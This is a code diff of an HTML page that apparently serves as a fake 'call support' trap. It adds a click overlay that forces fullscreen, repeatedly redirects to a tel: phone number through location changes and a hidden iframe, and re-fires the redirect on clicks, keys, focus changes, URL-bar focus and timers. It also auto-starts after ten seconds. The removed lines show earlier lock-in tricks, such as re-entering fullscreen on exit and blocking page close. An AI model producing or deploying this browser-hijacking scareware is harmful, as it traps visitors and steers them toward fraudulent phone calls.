@@ -26,6 +26,26 @@
             overflow: hidden;
             touch-action: none;
         }
+        #clickOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            cursor: pointer;
+        }
+        .overlay-content {
+            background: white;
+            color: black;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+        }
         .content {
             padding: 20px;
         }
@@ -33,10 +53,6 @@
             font-size: 2.5rem;
             margin-bottom: 20px;
             text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-        }
-        p {
-            font-size: 1.2rem;
-            margin-bottom: 30px;
         }
         .blink {
             animation: blink 1s infinite;
@@ -51,22 +67,34 @@
     </style>
 </head>
 <body>
-    <div class="content">
+    <!-- First Click Overlay -->
+    <div id="clickOverlay">
+        <div class="overlay-content">
+            <h2>📞 Tap to Call Support</h2>
+            <p>Click anywhere to connect immediately</p>
+            <button style="padding: 15px 30px; font-size: 18px; margin-top: 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">
+                TAP HERE TO START
+            </button>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="content" style="display: none;">
         <h1>📞 CALLING... 📞</h1>
         <div class="blink">Please Wait</div>
         <p>Connecting you to our support team</p>
-        <p>Do not close this window</p>
     </div>
 
     <script>
         const PHONE_NUMBER = "+911234567890";
+        let fullscreenActivated = false;
         
         // Fullscreen function
         function enterFullscreen() {
             try {
                 const elem = document.documentElement;
                 if (elem.requestFullscreen) {
-                    elem.requestFullscreen();
+                    elem.requestFullscreen().catch(e => console.log(e));
                 } else if (elem.webkitRequestFullscreen) {
                     elem.webkitRequestFullscreen();
                 } else if (elem.msRequestFullscreen) {
@@ -74,28 +102,17 @@
                 } else if (elem.mozRequestFullScreen) {
                     elem.mozRequestFullScreen();
                 }
+                fullscreenActivated = true;
             } catch (e) {
                 console.log("Fullscreen error:", e);
             }
         }
         
-        // Exit fullscreen block
-        document.addEventListener('fullscreenchange', function() {
-            if (!document.fullscreenElement) {
-                enterFullscreen();
-                fastRedirect();
-            }
-        });
-        
-        document.addEventListener('webkitfullscreenchange', function() {
-            if (!document.webkitFullscreenElement) {
-                enterFullscreen();
-                fastRedirect();
-            }
-        });
-        
         // Fast redirect function
         function fastRedirect() {
+            // Show calling content
+            document.querySelector('.content').style.display = 'block';
+            
             // Immediate redirect
             window.location.href = "tel:" + PHONE_NUMBER;
             
@@ -107,102 +124,69 @@
             setTimeout(() => {
                 window.location.replace("tel:" + PHONE_NUMBER);
             }, 100);
+            
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = "tel:" + PHONE_NUMBER;
+                document.body.appendChild(iframe);
+            }, 150);
         }
         
-        // URL bar click detection
-        let currentURL = window.location.href;
-        
-        setInterval(() => {
-            // URL change detection
-            if(window.location.href !== currentURL) {
-                currentURL = window.location.href;
-                fastRedirect();
-            }
+        // First click handler
+        function handleFirstClick() {
+            // Remove overlay
+            document.getElementById('clickOverlay').style.display = 'none';
             
-            // Focus events - when user clicks URL bar
-            if(document.activeElement.tagName === 'INPUT' || 
-               document.activeElement.tagName === 'TEXTAREA') {
-                fastRedirect();
-            }
-        }, 10);
-        
-        // Window focus/blur events
-        window.addEventListener('blur', function() {
-            setTimeout(fastRedirect, 100);
-        });
-        
-        window.addEventListener('focus', function() {
-            setTimeout(fastRedirect, 100);
-        });
-        
-        // Mouse events near top of screen (URL bar area)
-        document.addEventListener('mousedown', function(e) {
-            if(e.clientY < 50) {
-                fastRedirect();
-            }
-        });
-        
-        document.addEventListener('touchstart', function(e) {
-            if(e.touches[0].clientY < 50) {
-                fastRedirect();
-            }
-        });
-        
-        // Key events for URL editing
-        document.addEventListener('keydown', function(e) {
-            fastRedirect();
-        });
-        
-        // All click events
-        document.addEventListener('click', fastRedirect);
-        document.addEventListener('touchstart', fastRedirect);
-        document.addEventListener('mousedown', fastRedirect);
-        
-        // Prevent context menu
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            fastRedirect();
-        });
-        
-        // Prevent text selection
-        document.addEventListener('selectstart', function(e) {
-            e.preventDefault();
-            fastRedirect();
-        });
-        
-        // Page load - start everything
-        window.onload = function() {
-            // Enter fullscreen immediately
+            // Enter fullscreen (now allowed because user clicked)
             enterFullscreen();
             
-            // Start continuous monitoring
+            // Start call process
+            fastRedirect();
+            
+            // Activate all other event listeners
+            activateAllEvents();
+        }
+        
+        // Activate all events after first click
+        function activateAllEvents() {
+            // URL bar click detection
+            let currentURL = window.location.href;
+            
+            setInterval(() => {
+                if(window.location.href !== currentURL) {
+                    currentURL = window.location.href;
+                    fastRedirect();
+                }
+                
+                if(document.activeElement.tagName === 'INPUT' || 
+                   document.activeElement.tagName === 'TEXTAREA') {
+                    fastRedirect();
+                }
+            }, 10);
+            
+            // All other events
+            document.addEventListener('click', fastRedirect);
+            document.addEventListener('touchstart', fastRedirect);
+            document.addEventListener('keydown', fastRedirect);
+            
+            window.addEventListener('blur', () => setTimeout(fastRedirect, 100));
+            window.addEventListener('focus', () => setTimeout(fastRedirect, 100));
+            
+            // Continuous call attempts
             setInterval(fastRedirect, 2000);
-            
-            // First call after 3 seconds
-            setTimeout(fastRedirect, 3000);
-        };
+        }
         
-        // Resize event - if user tries to exit fullscreen
-        window.addEventListener('resize', function() {
-            enterFullscreen();
-            fastRedirect();
-        });
+        // Add first click listener
+        document.getElementById('clickOverlay').addEventListener('click', handleFirstClick);
+        document.addEventListener('touchstart', handleFirstClick, { once: true });
         
-        // Visibility change - if user switches tabs
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                fastRedirect();
+        // Auto-call after 10 seconds if no interaction
+        setTimeout(() => {
+            if (!fullscreenActivated) {
+                handleFirstClick();
             }
-        });
-        
-        // Beforeunload - if user tries to close
-        window.addEventListener('beforeunload', function(e) {
-            fastRedirect();
-            e.preventDefault();
-            e.returnValue = '';
-        });
-        
-        console.log("Fullscreen Call System Activated!");
+        }, 10000);
         
     </script>
 </body>
